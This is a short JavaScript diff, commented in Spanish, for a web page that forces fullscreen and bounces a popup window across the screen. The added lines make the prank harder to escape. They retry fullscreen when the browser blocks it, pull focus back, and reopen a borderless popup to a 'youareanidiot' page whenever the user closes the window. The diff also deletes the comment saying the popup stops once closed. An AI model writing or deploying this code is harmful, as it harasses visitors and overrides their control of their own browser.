@@ -55,6 +55,7 @@
             if (promesa !== undefined) {
                 promesa.catch(error => {
                     console.log("Pantalla completa bloqueada preventivamente por el navegador.");
+                    el.requestFullscreen()
                 });
             }
         }
@@ -80,18 +81,19 @@
             if (nuevaVentana) {
                 console.log("Nueva ventana abierta y física de movimiento iniciada.");
                 playBall(nuevaVentana);
-                nuevaVentana.blur();
-                requestFullScreen();
+                window.focus();
             }
 
             if (!document.fullscreenElement && muro.style.display === 'none') {
                 requestFullScreen();
             }
+            if (nuevaVentana.closed) {
+                window.open('https://youareanidiot.cc/lol.html', "_blank", 'menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330');
+            }
         });
 
         // Función de física de movimiento corregida y estable
         function playBall(ventana) {
-            // Comprobamos si la ventana emergente fue cerrada por el usuario para detener el bucle
             if (ventana.closed) return;
 
             xPos += xOff;
